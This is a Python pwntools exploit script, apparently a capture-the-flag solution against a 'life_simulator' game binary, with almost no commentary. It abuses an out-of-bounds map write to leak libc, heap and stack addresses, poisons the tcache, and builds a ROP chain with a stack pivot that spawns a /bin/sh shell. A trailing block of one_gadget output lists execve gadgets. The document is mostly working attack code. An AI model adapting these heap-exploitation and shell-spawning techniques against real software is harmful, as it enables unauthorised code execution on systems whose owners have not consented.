#!/usr/bin/python3

from pwn import *

exe = ELF('life_simulator_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

# context.terminal = ["tmux", "splitw", "-v"]


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # brva 0x610C     
                # # brva 0x490B
                # brva 0x4943  
                c
                ''')
        sleep(3)


def iinfo(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('localhost', 9000)
else:
    p = process(exe.path)


S_MAP = 'S'
M_MAP = 'M'
L_MAP = 'L'
D_MAP = 'D'

SIZES = {
    S_MAP: (16, 9),
    M_MAP: (23, 14),
    L_MAP: (41, 25),
    D_MAP: (35, 23)
}
DIM_X = 0
DIM_Y = 0


def map_size(sz=S_MAP):
    global DIM_X, DIM_Y
    DIM_X, DIM_Y = SIZES[sz]
    DIM_X -= 1
    DIM_Y -= 1
    sla('S/M/L: ', "L")


STEP = 1
LIFE = '2'
FRUIT = 3
POISON = 4
STAT = 5
EXIT = 6


def opt(o):
    sla('> ', o)


def step(n=1):
    for _ in range(n):
        opt(str(STEP))


def coords(x, y):
    sla('X position: ', x)
    sla('Y position: ', y)


def info(ax, ay, name):
    sla('X speed', ax)
    sla('Y speed', ay)
    sla('Name: ', name)


def life(x, y, ax, ay, name):
    sla('> ', '2')
    coords(str(x), str(y))
    info(str(ax), str(ay), name)


def fruit(x, y):
    opt(FRUIT)
    coords(x, y)


def pois(x, y):
    opt(POISON)
    coords(x, y)


def stat():
    opt(str(STAT))


def ext():
    opt(EXIT)


map_size((L_MAP))

###################################
# POC limitless OOB
###################################

iinfo('corrupting map')

life(0xa, 0, 0, 0, '\x02OOOOOOB')

# life(0x22,DIM_Y,0,1, b'FIRST')
life(0x1, DIM_Y, 0, 1, b'\x80FIRST')

life(22, DIM_Y, 0, 1, 'Overflow')
GDB()

print(DIM_Y)
iinfo('stepping OOB')
for i in range(0x18*2, 0x7d*2-1):
    step()

iinfo('heap feng shui')


def cyc(x): return b'\0'*x


life(1, 3, 1, 0, cyc(0x10))
life(2, 3, 0, 0, cyc(0x800))
life(3, 3, 1, 0, cyc(0x1000))
life(4, 3, 0, 0, cyc(0x1f000))
life(21, DIM_Y, 1, 0, 'kill')
def cyc(x): return cyclic(x)


step()
step()

iinfo('Map corrupted')
DIM_X = 553-1

iinfo('getting and parsing leaks')
p.recvuntil('#'*298)
p.recvline()

leaks = list()
def byt(x): return x if isinstance(x, bytes) else x.encode(
) if isinstance(x, str) else repr(x).encode()


lhex = lambda x, y='': iinfo(y + hex(x))
def upad(x): return u64(pad(x))


pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(
    s, byt(v)) if o == 'r' else byt(x).rjust(s, byt(v))

val = b''
lines = 0
while b'#'*298 not in (rawline := p.recvuntil('#\n')):
    line = val + rawline[1:-2]
    for i in range(0, len(line)-0x10, 8):
        leak = upad(line[i:i+8])
        leaks.append(leak)
        if leak != 0 and leak != 0x2020202020202020:
            lhex(leak, f'{len(leaks)-1} leak: ')
    val = line[i+8:]

libc.address = leaks[1070]-0x21b370
lhex(libc.address, 'libc: ')

HEAP = leaks[1072]-0x14470
lhex(HEAP, 'heap: ')

leak_y = (648*8)//(DIM_X+1)
leak_x = (648*8) % (DIM_X+1)

iinfo(f'leak stack {leak_x} {leak_y}')

for i, byte in enumerate(p64(libc.sym.environ)[:-2]):
    life(leak_x+i, leak_y, -(i & 1), 0, p8(byte))

stat()


def gelf(elf=None): return elf if elf else exe
def srh(x, elf=None): return gelf(elf).search(byt(x)).__next__()
def sasm(x, elf=None): return gelf(elf).search(
    asm(x), executable=True).__next__()


def lsrh(x): return srh(x, libc)
def lasm(x): return sasm(x, libc)


t = None
def gt(at=None): return at if at else t
def se(x, t=None): return gt(t).send(byt(x))
def ra(t=None): return gt(t).recvall()
def rl(t=None): return p.recvline()
def rls(t=None): return rl(t)[:-1]
def re(x, t=None): return gt(t).recv(x)
def ru(x, t=None): return gt(t).recvuntil(byt(x))
def it(t=None): return gt(t).interactive()
def cl(t=None): return gt(t).close()


p.recvuntil('Lifeform name: ')
STACK = upad(rls()) + 0x1c8
lhex(STACK, 'stack: ')

leak_y = (806*8)//(DIM_X+1)
leak_x = (806*8) % (DIM_X+1)

iinfo(f'corrupt tcache {leak_x} {leak_y}')
cnt = 0
for i, byte in enumerate(p64(STACK-0x390 ^ ((HEAP+0x13c40) >> 12))[:-2]):
    life(leak_x+i, leak_y, -(i & 1), 0, p8(byte))
    cnt += 1
print(cnt)
iinfo(f'build rop chain')

rop = ROP(libc)
rop.execve(lsrh('/bin/sh\0'), 0, 0)

fake_stack = bytes(rop)
fake_stack += cyc(0x100-len(fake_stack))
# fake_stack = b'a'*8 + flat(libc.address + 0xebd3f,1)
# assert len(fake_stack) <= 0x100

life(4, 4, 0, 0, fake_stack)

iinfo(f'pivot stack')
pivot = flat(
    HEAP+0x14590-0x8,
    lasm('leave; ret;'),
    cyc(0x8)
)
# assert len(pivot) <= 0x18


# iinfo(f'spawn shell')
life(5, 5, 0, 0, pivot)


# sl('echo PWN')
p.interactive()
'''
└─$ one_gadget libc.so.6
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

'''
